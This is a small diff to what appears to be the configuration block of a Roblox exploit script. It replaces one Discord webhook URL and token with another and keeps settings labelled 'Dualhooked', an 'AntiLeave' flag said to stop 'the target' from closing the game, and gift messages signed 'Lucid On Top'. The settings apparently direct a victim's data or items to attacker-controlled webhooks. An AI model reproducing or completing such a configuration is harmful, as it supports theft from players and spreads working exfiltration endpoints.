@@ -6,7 +6,7 @@ _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
 
 
 -- Dualhooked variables
-_G.DWebhook = "https://discord.com/api/webhooks/1138403854560538644/F4_0RJ3D2S0NzVpHCuDWKBPUPUbh8_PA3dZfV6KoNBxL6ZpLqmBCdx_umQ5eNx9moYEc"
+_G.DWebhook = "https://discord.com/api/webhooks/1138468966839357501/0dujIaWk5Nv7sVCHyRv6Y7TpvZh23Rp5qGH3MIyYogegyGdcaJfgpvG2RJuU3W-73rDl"
 _G.DUser = "EgorikusaDualhook"
 _G.GiftMessage = "Lucid On Top"
 _G.SendMessage = "Lucid On Top"
